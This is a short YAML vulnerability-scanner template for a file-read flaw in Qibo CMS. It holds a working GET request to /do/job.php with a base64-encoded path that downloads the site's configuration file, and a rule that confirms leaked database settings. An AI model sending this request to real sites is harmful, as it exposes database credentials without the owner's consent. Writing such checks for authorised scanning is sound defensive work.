expression: r0()
id: qibo-cms-job-file-read
info:
  author: Cuerz
  name: Qibo CMS Job File Read
  reference:
  - https://blog.csdn.net/m0_46371267/article/details/124346624
  severity: high
  verified: true
rules:
  r0:
    expression: response.status==200 && response.body.bcontains(b'$webdb') && response.raw_header.bcontains(b'ph<')
    request:
      method: GET
      path: /do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8
